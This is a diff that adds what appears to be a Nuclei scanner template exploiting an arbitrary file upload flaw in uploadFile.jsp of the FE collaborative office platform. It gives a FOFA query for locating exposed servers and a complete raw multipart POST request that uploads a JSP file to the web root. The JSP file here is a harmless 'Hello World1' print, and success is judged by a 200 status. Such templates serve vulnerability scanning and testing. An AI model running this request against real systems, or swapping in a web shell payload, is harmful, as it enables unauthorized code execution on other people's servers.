@@ -1,0 +1,43 @@
+id: poc-cgbf4hxhmyyuksgu
+info:
+  name: FE协作办公平台uploadFile任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cgbf4hxhmyyuksgu'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cgbf4hxhmyyuksgu
+    fofa: body="applyTheme/css/StyleSheet.css"
+http:
+- raw:
+  - 'POST /common/uploadFile.jsp?action=save&savePath=/images/upload/&fileName=123.jpg&title1=%C9%CF%B4%AB%CE%C4%BC%FE&title2=%D1%A1%D4%F1%CE%C4%BC%FE&allowsize=null&extName=.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylBU670lIdrGgVSWG
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Accept: */*
+
+    Content-Length: 212
+
+
+    ------WebKitFormBoundarylBU670lIdrGgVSWG
+
+    Content-Disposition: form-data; name="accessory"; filename="123.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    <%out.println("Hello World1");%>
+
+    ------WebKitFormBoundarylBU670lIdrGgVSWG--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
